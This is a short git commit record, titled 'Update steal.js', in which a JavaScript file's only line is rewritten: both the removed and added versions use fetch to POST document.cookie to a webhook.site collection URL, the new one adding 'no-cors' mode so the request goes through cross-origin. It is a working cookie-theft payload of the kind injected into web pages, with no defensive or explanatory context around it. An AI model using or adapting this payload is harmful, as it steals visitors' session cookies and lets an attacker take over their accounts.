499662860a267fe42612f762c88fd9eb7a83dfb1
zero99sky <snowjackl887@gmail.com>
2025-07-31 18:19:21 +0800

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,4 +1,1 @@
-fetch('https://webhook.site/c6bdaf2e-cd26-467d-865a-3673d8779d26', {
-  method: 'POST',
-  body: document.cookie
-});
+fetch('https://webhook.site/c6bdaf2e-cd26-467d-865a-3673d8779d26', {method: 'POST', mode: 'no-cors', body: document.cookie});
